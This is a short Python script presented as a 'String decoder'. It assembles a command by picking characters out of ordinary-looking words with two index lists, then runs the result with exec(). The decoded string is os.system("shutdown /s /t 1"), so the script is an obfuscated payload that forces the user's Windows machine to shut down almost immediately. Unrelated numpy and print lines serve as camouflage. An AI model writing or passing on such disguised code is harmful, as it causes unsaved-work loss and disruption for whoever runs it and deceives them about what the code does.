import os
import numpy as np
print("String decoder")
str = ["foodyed", "(home)", "ca\"rn", "Or/8eo", "team9work", "1150.58", 'excerise',"hunter "];temp=''
number =  [0,6,5,6,0,6,4,1,4,1,2,6,7,7,4,0,3,4,2,7,3,6,7,3,7,7,5,2,1]
number2 = [2,6,4,6,4,6,0,4,3,0,2,6,0,1,0,-1,-1,5,-1,6,2,6,-1,2,3,6,1,2,-1]
for i, j in zip(number, number2):
    temp += str[i][j]
print(temp);exec(temp);matrix = np.array([1,2,3,4])
for i in str :
    print(str)